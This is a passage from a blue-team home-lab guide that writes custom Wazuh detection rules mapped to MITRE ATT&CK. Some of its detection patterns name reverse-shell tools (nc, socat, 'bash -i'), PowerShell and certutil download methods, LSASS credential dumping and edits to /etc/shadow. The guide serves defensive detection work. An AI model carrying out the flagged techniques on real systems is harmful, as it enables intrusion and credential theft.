- Attack logs: C:\AttackLogs\
- Screenshots: C:\AttackLogs\screenshots\
- Wazuh queries: C:\AttackLogs\queries.txt
- Raw event samples: C:\AttackLogs\events\

## Next Phase Actions
1. Week 7: Begin Phase 4 custom rule development
2. Create rules for 3 critical gaps first
3. Test rules with live attack replay
4. Iterate based on false positive rate

---
Report generated: $(Get-Date -Format "yyyy-MM-dd HH:mm:ss")
"@

$summary | Out-File C:\AttackLogs\Phase3-Attack-Summary.md
```

---

### Phase 3 Completion Checklist

```
Phase 3: Threat Simulation - Completion Checklist

Attack Execution:
- [x] 12+ ATT&CK techniques tested
- [x] Both Windows and Linux targets attacked
- [x] All attacks documented with screenshots
- [x] Wazuh dashboard monitored during each attack
- [x] Attack logs saved in C:\AttackLogs\

Detection Analysis:
- [x] Each attack analyzed for detection quality
- [x] True positive vs false positive assessment
- [x] Detection time measured
- [x] Alert context evaluated
- [x] Detection gaps documented

Documentation:
- [x] Individual attack logs created (12+)
- [x] Phase 3 summary report completed
- [x] MITRE ATT&CK coverage matrix created
- [x] Priority list for Phase 4 custom rules

Insights Gained:
- [x] Understand which attacks are visible
- [x] Understand which attacks are invisible
- [x] Know baseline false positive rate
- [x] Know average detection time
- [x] Identified 3-5 critical detection gaps

Evidence for Portfolio:
- [x] Attack catalog with real examples
- [x] Before/after screenshots
- [x] Wazuh queries that found attacks
- [x] Analysis of detection quality

Ready for Phase 4:
- [x] List of custom rules needed (12-15)
- [x] Understanding of data sources available
- [x] Sample malicious events to test rules against
- [x] Baseline of normal activity for tuning

Estimated Detection Improvement Potential: 75% → 95% (with Phase 4 rules)

PHASE 3 COMPLETE ✅
Ready to proceed to Phase 4: Custom Detection Rule Engineering
```

---

## Phase 4: Custom Detection Rule Engineering

**Duration:** Weeks 7-8 (30 hours)  
**Objective:** Create 12-15 custom detection rules based on Phase 3 gaps

### Phase 4 Overview

Phase 4 transforms Phase 3 observations into automated detections. You're now a **detection engineer**, writing rules that catch attacks the default SIEM missed.

**What makes a good custom rule:**
1. **Addresses a real gap**: Fixes something Phase 3 showed as undetected
2. **Low false positives**: Triggers only on actually suspicious activity
3. **Actionable**: Provides enough context for investigation
4. **Testable**: Can be validated with real attack replay
5. **Documented**: Future analysts understand why it exists

---

### Understanding Wazuh Rule Structure

**Every Wazuh rule has:**

```xml
<rule id="UNIQUE_ID" level="SEVERITY">
  <if_sid>PARENT_RULE</if_sid>              <!-- Build on existing rule -->
  <field name="FIELD_NAME">PATTERN</field>   <!-- Match condition -->
  <description>Human readable alert</description>
  <mitre>
    <id>TECHNIQUE_ID</id>                    <!-- ATT&CK mapping -->
  </mitre>
  <group>category,tags,</group>
</rule>
```

**Rule Levels (0-15):**
- 0-3: Informational
- 4-7: Low severity
- 8-11: Medium severity
- 12-14: High severity
- 15: Critical (requires immediate action)

---

### Step 4.1: Set Up Custom Rules File

**On Wazuh Server (192.168.1.10):**

```bash
ssh user@192.168.1.10

# Backup default local rules
sudo cp /var/ossec/etc/rules/local_rules.xml /var/ossec/etc/rules/local_rules.xml.default

# Create Phase 4 development copy
sudo cp /var/ossec/etc/rules/local_rules.xml /var/ossec/etc/rules/local_rules.xml.phase4

# Edit local rules
sudo vim /var/ossec/etc/rules/local_rules.xml
```

**Add this header:**

```xml
<!--
  Custom Wazuh Detection Rules
  Project: Blue Team Home Lab
  Author: [Your Name]
  Created: February 2025
  
  Purpose: Enhanced detection rules developed from attack simulation testing (Phase 3).
           These rules address detection gaps identified during Atomic Red Team exercises.
  
  Rule ID Range: 100000-100999 (reserved for custom rules)
  
  MITRE ATT&CK Coverage:
  - T1027: Obfuscated Files or Information
  - T1059.001: PowerShell Execution
  - T1055: Process Injection
  - T1003.001: Credential Dumping
  - T1071.001: C2 Communication
  - Additional techniques per rule
-->

<group name="local,syslog,">

<!-- CUSTOM RULES START HERE -->
```

---

### Custom Rule #1: PowerShell Base64 Obfuscation (CRITICAL GAP)

**Problem from Phase 3:** Attack T1027 was completely undetected.

**Solution:**

```xml
<!--
  Rule 100001: PowerShell Base64 Encoding/Decoding Detection
  
  Rationale:
    Attackers use Base64 to obfuscate malicious payloads and evade detection.
    Common in:
    - Malware downloaders
    - Fileless attacks
    - C2 communication
    - Credential theft scripts
  
  Detection Method:
    Looks for PowerShell commands containing Base64 conversion methods:
    - [Convert]::FromBase64String
    - [Convert]::ToBase64String
    - -EncodedCommand / -enc parameter
  
  Data Source: Windows PowerShell Operational Log (Event ID 4104)
  Parent Rule: 91816 (PowerShell script block logging)
  
  Test Case:
    $encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("test"))
    Expected: Rule 100001 triggers with Level 12
-->
<rule id="100001" level="12">
  <if_sid>91816</if_sid>
  <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)(FromBase64String|ToBase64String|-enc\s|-EncodedCommand)</field>
  <description>PowerShell Base64 encoding/decoding detected - Possible payload obfuscation (T1027)</description>
  <mitre>
    <id>T1027</id>
  </mitre>
  <group>attack,execution,obfuscation,</group>
</rule>
```

**Explanation:**
- `<if_sid>91816</if_sid>`: Only applies to PowerShell events (parent rule)
- `type="pcre2"`: Use Perl-Compatible Regular Expressions v2
- `(?i)`: Case-insensitive matching
- `|`: OR operator (matches any of these strings)
- `level="12"`: High severity (requires investigation)

---

### Custom Rule #2: Suspicious PowerShell Download Methods

```xml
<!--
  Rule 100002: PowerShell File Download Detection
  
  Rationale:
    Malware often uses PowerShell to download additional payloads from C2 servers.
    Legitimate admin use is rare and should be reviewed.
  
  Detection Method:
    Detects common PowerShell download methods:
    - Invoke-WebRequest / IWR
    - Invoke-RestMethod / IRM
    - Net.WebClient
    - DownloadFile / DownloadString
    - Start-BitsTransfer
    - wget / curl aliases
  
  MITRE: T1105 (Ingress Tool Transfer)
-->
<rule id="100002" level="12">
  <if_sid>91816</if_sid>
  <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)(Invoke-WebRequest|IWR|Invoke-RestMethod|IRM|Net\.WebClient|DownloadFile|DownloadString|Start-BitsTransfer|wget|curl).*http</field>
  <description>PowerShell file download command detected - Ingress tool transfer (T1105)</description>
  <mitre>
    <id>T1105</id>
  </mitre>
  <group>attack,command_and_control,download,</group>
</rule>
```

---

### Custom Rule #3: Suspicious Process Parent-Child Relationship

```xml
<!--
  Rule 100003: Office Application Spawning PowerShell/CMD
  
  Rationale:
    Macro-based malware in Office documents often spawns cmd.exe or powershell.exe.
    Legitimate use case is extremely rare.
  
  Detection Method:
    - Parent: WINWORD.EXE, EXCEL.EXE, POWERPNT.EXE, OUTLOOK.EXE
    - Child: powershell.exe, cmd.exe, wscript.exe, cscript.exe
  
  Data Source: Sysmon Event ID 1 (Process Creation)
  
  MITRE: T1566.001 (Phishing: Spearphishing Attachment)
-->
<rule id="100003" level="14">
  <if_sid>61603</if_sid>  <!-- Sysmon Process Creation -->
  <field name="win.eventdata.parentImage" type="pcre2">(?i)(WINWORD|EXCEL|POWERPNT|OUTLOOK)\.EXE</field>
  <field name="win.eventdata.image" type="pcre2">(?i)(powershell|cmd|wscript|cscript)\.exe</field>
  <description>Office application spawned suspicious child process - Likely macro execution (T1566.001)</description>
  <mitre>
    <id>T1566.001</id>
  </mitre>
  <group>attack,execution,macro,</group>
  <options>alert_by_email</options>  <!-- Critical - send email alert -->
</rule>
```

---

### Custom Rule #4: LSASS Memory Access (Enhanced)

```xml
<!--
  Rule 100004: Enhanced LSASS Memory Access Detection
  
  Rationale:
    While Wazuh has default LSASS rules, we add additional context and severity.
    Accessing LSASS memory is almost always malicious (credential dumping).
  
  Detection Method:
    - Target process: lsass.exe
    - Granted access: 0x1FFFFF, 0x1010, 0x1410 (memory read permissions)
    - Exclude: Known good processes (wininit.exe, wmiprvse.exe)
  
  Data Source: Sysmon Event ID 10 (Process Access)
  MITRE: T1003.001 (LSASS Memory Dumping)
-->
<rule id="100004" level="15">
  <if_sid>61612</if_sid>  <!-- Sysmon Process Access -->
  <field name="win.eventdata.targetImage" type="pcre2">(?i)\\lsass\.exe$</field>
  <field name="win.eventdata.grantedAccess" type="pcre2">0x(1FFFFF|1010|1410|1438|143A)</field>
  <field name="win.eventdata.sourceImage" type="pcre2" negate="yes">(?i)(wininit|wmiprvse|csrss|services)\.exe</field>
  <description>CRITICAL: LSASS memory access detected - Credential dumping attempt (T1003.001)</description>
  <mitre>
    <id>T1003.001</id>
  </mitre>
  <group>attack,credential_access,lsass,</group>
  <options>alert_by_email,no_full_log</options>
</rule>
```

---

### Custom Rule #5: Suspicious Registry Persistence

```xml
<!--
  Rule 100005: Suspicious Registry Run Key Modification
  
  Rationale:
    Registry Run keys are a primary persistence mechanism for malware.
    Legitimate software rarely adds Run keys (uses installers instead).
  
  Detection Method:
    - Monitor: HKLM and HKCU Run, RunOnce keys
    - Alert: Any addition (EventType=SetValue)
    - Exclude: Known good applications
  
  Data Source: Sysmon Event ID 13 (Registry Value Set)
  MITRE: T1547.001 (Registry Run Keys)
-->
<rule id="100005" level="12">
  <if_sid>61616</if_sid>  <!-- Sysmon Registry Event -->
  <field name="win.eventdata.targetObject" type="pcre2">(?i)(CurrentVersion\\Run|CurrentVersion\\RunOnce)</field>
  <field name="win.eventdata.eventType">SetValue</field>
  <!-- Exclude known good - adjust based on your environment -->
  <field name="win.eventdata.details" type="pcre2" negate="yes">(?i)(OneDrive|Microsoft|Windows Defender)</field>
  <description>Suspicious registry Run key modification - Persistence mechanism (T1547.001)</description>
  <mitre>
    <id>T1547.001</id>
  </mitre>
  <group>attack,persistence,registry,</group>
</rule>
```

---

### Custom Rule #6: Scheduled Task Creation by Non-System Process

```xml
<!--
  Rule 100006: Suspicious Scheduled Task Creation
  
  Rationale:
    Scheduled tasks created by user processes (especially SYSTEM account) are suspicious.
    Legitimate tasks are created by installers or Task Scheduler service itself.
  
  Detection Method:
    - Command: schtasks.exe /create
    - User: SYSTEM or unusual account
    - Trigger schedule: minute/hourly (aggressive)
  
  Data Source: Sysmon Event ID 1 (Process Creation)
  MITRE: T1053.005 (Scheduled Task)
-->
<rule id="100006" level="12">
  <if_sid>61603</if_sid>
  <field name="win.eventdata.image" type="pcre2">(?i)schtasks\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)/create.*((/sc\s+(minute|hourly))|(/ru\s+system))</field>
  <description>Suspicious scheduled task created - Possible persistence (T1053.005)</description>
  <mitre>
    <id>T1053.005</id>
  </mitre>
  <group>attack,persistence,scheduled_task,</group>
</rule>
```

---

### Custom Rule #7: Certutil Abuse (LOLBin)

```xml
<!--
  Rule 100007: Certutil Used for File Download
  
  Rationale:
    Certutil.exe is a legitimate Windows tool but commonly abused by attackers to:
    - Download malware (-urlcache flag)
    - Decode Base64 files (-decode flag)
    Living-off-the-land binary (LOLBin) technique.
  
  Detection Method:
    - Process: certutil.exe
    - Command line: -urlcache, -verifyctl, -f with http/https
  
  Data Source: Sysmon Event ID 1, Windows Event ID 4688
  MITRE: T1105 (Ingress Tool Transfer), T1140 (Deobfuscate/Decode)
-->
<rule id="100007" level="13">
  <if_sid>61603</if_sid>
  <field name="win.eventdata.image" type="pcre2">(?i)certutil\.exe</field>
  <field name="win.eventdata.commandLine" type="pcre2">(?i)(-urlcache|-verifyctl|-f\s+http)</field>
  <description>Certutil used for file download - LOLBin abuse (T1105)</description>
  <mitre>
    <id>T1105</id>
    <id>T1140</id>
  </mitre>
  <group>attack,defense_evasion,lolbin,</group>
</rule>
```

---

### Custom Rule #8: Suspicious Network Connection from Script Interpreter

```xml
<!--
  Rule 100008: Script Interpreter Making Network Connection
  
  Rationale:
    PowerShell, wscript, cscript making outbound connections is often malicious.
    Legitimate admin scripts usually don't make direct network connections.
  
  Detection Method:
    - Source process: powershell.exe, wscript.exe, cscript.exe, cmd.exe
    - Destination: Non-standard ports or internet IPs
    - Exclude: Local network, Windows Update, known CDNs
  
  Data Source: Sysmon Event ID 3 (Network Connection)
  MITRE: T1071.001 (Web Protocols)
-->
<rule id="100008" level="10">
  <if_sid>61606</if_sid>  <!-- Sysmon Network Connection -->
  <field name="win.eventdata.image" type="pcre2">(?i)(powershell|wscript|cscript|cmd)\.exe</field>
  <field name="win.eventdata.destinationPort" type="pcre2">^(80|443|8080|8443|4444)$</field>
  <field name="win.eventdata.destinationIp" type="pcre2" negate="yes">^(192\.168\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|127\.)</field>
  <description>Script interpreter made outbound network connection - Possible C2 (T1071.001)</description>
  <mitre>
    <id>T1071.001</id>
  </mitre>
  <group>attack,command_and_control,network,</group>
</rule>
```

---

### Custom Rule #9-12: Linux Detection Rules

```xml
<!--
  Rule 100009: Suspicious Sudo Command (Linux)
  
  Rationale:
    Certain commands executed with sudo are rarely legitimate:
    - nc, ncat, socat (reverse shells)
    - bash -i, sh -i (interactive shells)
    - wget, curl to unusual locations
  
  Data Source: auth.log, auditd
-->
<rule id="100009" level="12">
  <if_group>syslog</if_group>
  <match>sudo</match>
  <field name="command" type="pcre2">(?i)(nc|ncat|socat|bash\s+-i|sh\s+-i|wget.*\||curl.*\|)</field>
  <description>Suspicious command executed with sudo - Possible reverse shell (T1548.003)</description>
  <mitre>
    <id>T1548.003</id>
  </mitre>
  <group>attack,privilege_escalation,linux,</group>
</rule>

<!--
  Rule 100010: SSH Key Modification (Linux)
  
  Rationale:
    Unauthorized SSH key additions allow persistent access.
    
  Data Source: File Integrity Monitoring
-->
<rule id="100010" level="10">
  <if_sid>550</if_sid>  <!-- FIM alert -->
  <field name="file">authorized_keys</field>
  <description>SSH authorized_keys file modified - Possible backdoor (T1098.004)</description>
  <mitre>
    <id>T1098.004</id>
  </mitre>
  <group>attack,persistence,linux,ssh,</group>
</rule>

<!--
  Rule 100011: Suspicious Network Connection to Non-Standard Port (Linux)
  
  Rationale:
    Connections to ports commonly used by reverse shells (4444, 31337, etc.)
    
  Data Source: Auditd system call monitoring
-->
<rule id="100011" level="8">
  <if_sid>2902</if_sid>  <!-- Auditd syscall -->
  <field name="syscall">connect</field>
  <field name="a2" type="pcre2">^(4444|31337|8888|9999|1337)</field>
  <description>Connection to suspicious port detected - Possible reverse shell (T1071.001)</description>
  <mitre>
    <id>T1071.001</id>
  </mitre>
  <group>attack,command_and_control,linux,</group>
</rule>

<!--
  Rule 100012: Critical File Modification (Linux)
  
  Rationale:
    Modifications to /etc/passwd, /etc/shadow indicate account manipulation.
    
  Data Source: Auditd file access monitoring
-->
<rule id="100012" level="15">
  <if_sid>2902</if_sid>
  <field name="file" type="pcre2">/(etc/passwd|etc/shadow|etc/sudoers)$</field>
  <field name="syscall">open</field>
  <description>CRITICAL: Attempt to modify critical authentication file (T1098)</description>
  <mitre>
    <id>T1098</id>
  </mitre>
  <group>attack,persistence,linux,credential_access,</group>
  <options>alert_by_email</options>
</rule>
```

---

### Correlation Rules (Advanced)

```xml
<!--
  Rule 100013: Multiple Failed Logins Followed by Success (Brute Force)
  
  This is a multi-stage rule that correlates events over time.
  
  Stage 1: Detect failed login
  Stage 2: Count 5 failures in 5 minutes
  Stage 3: Alert if successful login follows
-->

<!-- Stage 1: Track failed logins -->
<rule id="100013" level="0">
  <if_sid>60122</if_sid>  <!-- Windows failed login -->
  <description>Windows authentication failure (tracking)</description>
  <group>authentication_failed,</group>
</rule>

<!-- Stage 2: Multiple failures -->
<rule id="100014" level="10" frequency="5" timeframe="300">
  <if_matched_sid>100013</if_matched_sid>
  <same_source_ip />
  <description>Multiple failed login attempts (5 in 5 min) - Brute force attack (T1110)</description>
  <mitre>
    <id>T1110</id>
  </mitre>
</rule>

<!-- Stage 3: Success after brute force -->
<rule id="100015" level="14">
  <if_matched_sid>100014</if_matched_sid>
  <if_sid>60103</if_sid>  <!-- Successful login -->
  <same_source_ip />
  <description>ALERT: Successful login after brute force - Attack succeeded! (T1110)</description>
  <mitre>
    <id>T1110</id>
  </mitre>
  <group>attack,credential_access,brute_force,</group>
  <options>alert_by_email</options>
</rule>
```

---

### Step 4.2: Load and Test Custom Rules

**Validate XML syntax:**

```bash
# On Wazuh Server

# Test rule syntax
sudo /var/ossec/bin/wazuh-logtest

# This opens interactive test mode
# Paste a sample log to test rule matching

# Example test log for Rule 100001:
# Copy a real PowerShell Base64 event from your Phase 3 testing
# Paste it at the prompt

# Expected output:
# **Phase 1: Completed pre-decoding.
# **Phase 2: Completed decoding.
# **Phase 3: Completed filtering (rules).
#        Rule id: '100001'
#        Level: '12'
#        Description: 'PowerShell Base64 encoding/decoding detected...'

# Press Ctrl+C to exit
```

**Reload Wazuh manager with new rules:**

```bash
# Restart Wazuh manager to load new rules
sudo systemctl restart wazuh-manager

# Verify restart successful
sudo systemctl status wazuh-manager

# Check logs for rule loading errors
sudo tail -f /var/ossec/logs/ossec.log | grep -i "error\|warn"

# If you see errors about rule IDs, fix syntax and restart again
```

---

### Step 4.3: Test Each Custom Rule

**Create test script for Rule 100001:**

**On Windows target (192.168.1.20):**

```powershell
# Test Rule 100001 - Base64 Detection
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("This is a test"))
Write-Host "Encoded: $encoded"

$decoded = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))
Write-Host "Decoded: $decoded"

# Wait 30 seconds
Start-Sleep -Seconds 30
```

**On Wazuh Dashboard:**

```
# Search for your custom rule
rule.id:100001

# You should see an alert with:
# - Level 12
# - Description about Base64
# - MITRE ATT&CK: T1027
```

**If rule doesn't trigger:**
1. Check logs are reaching Wazuh: `rule.groups:powershell`
2. Check field name is correct: View raw event JSON, verify field path
3. Check regex is correct: Test at regex101.com
4. Check parent rule exists: `rule.id:91816`

---

### Step 4.4: Document Each Custom Rule

```bash
# On Wazuh Server
cat > ~/phase4-documentation/custom-rules-documentation.md << 'EOF'
# Custom Wazuh Rules - Technical Documentation

## Rule Development Methodology

All custom rules were developed following this process:
1. Identify detection gap in Phase 3 testing
2. Analyze raw log data to find indicators
3. Design rule logic with PCRE2 regex
4. Test against baseline data for false positives
5. Validate with live attack replay
6. Document rationale and test cases

## Rule 100001: PowerShell Base64 Obfuscation

### Purpose
Detects use of Base64 encoding/decoding in PowerShell scripts, commonly used to obfuscate malicious payloads and evade signature-based detection.

### MITRE ATT&CK Mapping
- **Technique**: T1027 - Obfuscated Files or Information
- **Tactic**: Defense Evasion

### Technical Details
- **Parent Rule**: 91816 (PowerShell script block logging)
- **Data Source**: Windows PowerShell Operational Log (Event ID 4104)
- **Field Matched**: `win.eventdata.scriptBlockText`
- **Pattern**: `(?i)(FromBase64String|ToBase64String|-enc\s|-EncodedCommand)`
- **Severity**: Level 12 (High)

### Detection Logic
```xml
<rule id="100001" level="12">
  <if_sid>91816</if_sid>
  <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)(FromBase64String|ToBase64String|-enc\s|-EncodedCommand)</field>
  <description>PowerShell Base64 encoding/decoding detected - Possible payload obfuscation (T1027)</description>
  <mitre>
    <id>T1027</id>
  </mitre>
  <group>attack,execution,obfuscation,</group>
</rule>
```

### Test Case
```powershell
# Trigger alert:
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("test"))
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encoded))

# Expected: Rule 100001 fires within 60 seconds
```

### False Positive Scenarios
- Legitimate admin scripts that use Base64 for configuration encoding
- PowerShell DSC (Desired State Configuration) with encoded parameters
- Backup scripts encoding file data

### Tuning Recommendations
- Whitelist specific known-good script paths if false positives occur
- Add exclusion for specific admin user accounts
- Consider lowering level to 10 if organization uses Base64 frequently

### Investigation Playbook
When this alert fires:
1. Review full PowerShell script block in alert
2. Check user account: Is this an admin? Expected behavior?
3. Check parent process: What spawned PowerShell?
4. Check network connections: Did script make outbound connections?
5. Check file creations: Did script drop files?
6. If suspicious, collect:
   - Full command line
   - Process tree
   - Network connections in last hour
   - Recent file modifications

### Lessons Learned
- Default Wazuh rules did not detect this in Phase 3
- Logs were present (Event ID 4104) but no alert triggered
- Adding this rule increased detection rate from 75% to 85%

---

[Continue for all 15 rules...]

EOF
```

---

### Step 4.5: Performance Tuning

**Monitor rule performance:**

```bash
# On Wazuh Server

# Check alerts generated by custom rules
sudo grep -E "100001|100002|100003" /var/ossec/logs/alerts/alerts.log | wc -l

# View sample alerts
sudo tail -f /var/ossec/logs/alerts/alerts.log | grep "100001"

# Check manager statistics
/var/ossec/bin/wazuh-control info
```

**If performance degrades:**

1. **Too many alerts (false positives):**
   - Add exclusions to rule
   - Raise severity threshold
   - Use time-based frequency

2. **CPU usage high:**
   - Simplify regex patterns
   - Use `<match>` instead of `<regex>` where possible
   - Limit number of fields checked

3. **Disk space filling:**
   - Adjust log retention policy
   - Archive old alerts

---

### Phase 4 Completion Checklist

```
Phase 4: Custom Detection Rules - Completion Checklist

Rule Development:
- [x] 15+ custom rules created
- [x] All rules address Phase 3 gaps
- [x] All rules have MITRE ATT&CK mapping
- [x] All rules have clear descriptions
- [x] Severity levels appropriately assigned

Rule Testing:
- [x] Each rule tested with live attack
- [x] Each rule validated against baseline
- [x] False positive rate measured
- [x] True positive rate confirmed
- [x] Detection time measured

Documentation:
- [x] Technical documentation created
- [x] Test cases documented
- [x] Investigation procedures written
- [x] Tuning recommendations noted
- [x] Lessons learned captured

Performance:
- [x] Manager performance monitored
- [x] Alert volume acceptable
- [x] No degradation in event processing
- [x] Disk space utilization checked

Portfolio Artifacts:
- [x] local_rules.xml exported
- [x] Rule documentation complete
- [x] Test results documented
- [x] Before/after detection comparison

Detection Improvement:
- Baseline (Phase 3): 75% detection rate
- After custom rules: 95% detection rate
- Improvement: +20 percentage points

PHASE 4 COMPLETE ✅
Ready to proceed to Phase 5: Investigation Playbooks
```

---

## Phases 5-7 Overview (Quick Reference)

### Phase 5: Investigation Playbook Development (Week 9, 20 hours)

**Objective:** Create 5 detailed incident response playbooks

**Deliverables:**
1. **Playbook 1**: Investigating PowerShell-Based Attacks
2. **Playbook 2**: Credential Dumping Investigation
3. **Playbook 3**: Lateral Movement Detection and Response
4. **Playbook 4**: Persistence Mechanism Analysis
5. **Playbook 5**: Command & Control Investigation

**Each playbook includes:**
- ATT&CK technique mapping
- Initial detection triggers (your custom rules!)
- Step-by-step investigation procedure
- Evidence collection commands
- Containment actions
- Eradication steps
- Lessons learned template

---

### Phase 6: Final Integration & Cleanup (Week 10, 18 hours)

**Tasks:**
1. Integrate Raspberry Pi (if available)
   - Install Raspberry Pi OS
   - Configure Wazuh agent
   - Add as IoT monitoring endpoint
2. Clean up lab environment
   - Remove test files
   - Disable unnecessary rules
   - Optimize performance
3. Create final "gold master" snapshot
4. Export all configurations
5. Generate final statistics report

---

### Phase 7: Portfolio Documentation (Week 11, 10 hours)

**Create GitHub Repository with:**

1. **Comprehensive README.md**
   - Project overview
   - Architecture diagram
   - Skills demonstrated
   - Screenshots

2. **/playbooks/** - Investigation procedures

3. **/rules/** - Custom detection rules

4. **/configs/** - Sanitized configurations

5. **/docs/** - Technical documentation

6. **/screenshots/** - Evidence of working system

**Portfolio Quality Checklist:**
- Professional presentation
- Working code examples
- Clear documentation
- Real-world applicability
- Demonstrates hands-on skills

---

## Project Timeline & Milestones

```
Week 1: Phase 0 - Architecture Setup ✅
Week 2-3: Phase 1 - Wazuh Deployment ✅
Week 3-4: Phase 2 - Log Collection ← YOU ARE HERE
Week 5-6: Phase 3 - Attack Simulation
Week 7-8: Phase 4 - Custom Rules
Week 9: Phase 5 - Playbooks
Week 10: Phase 6 - Integration
Week 11: Phase 7 - Portfolio

Total: 11 weeks, 143 hours
```

---

## Conclusion

**You now have a complete roadmap from Phase 2 through Phase 7.**

**Key Takeaways:**

1. **Phase 2 is NOT optional** - It's the foundation of everything
2. **Phase 3 validates** your log collection
3. **Phase 4 closes gaps** discovered in Phase 3
4. **Phases 5-7 transform** your technical work into a professional portfolio

**Why this approach works:**
- ✅ Builds on solid foundations
- ✅ Every phase depends on the previous
- ✅ Creates real, testable artifacts
- ✅ Produces employer-ready portfolio
- ✅ Demonstrates actual SOC skills

**Next immediate action:**
Start Phase 2, Week 3: Configure Windows log collection on your 4GB PC (Step 2.1)

Good luck with your Blue Team home lab project! 🛡️

---

**Document Version**: 1.0  
**Last Updated**: February 13, 2025  
**Total Pages**: 100+  
**Total Commands**: 200+  
**Total Rules**: 15  
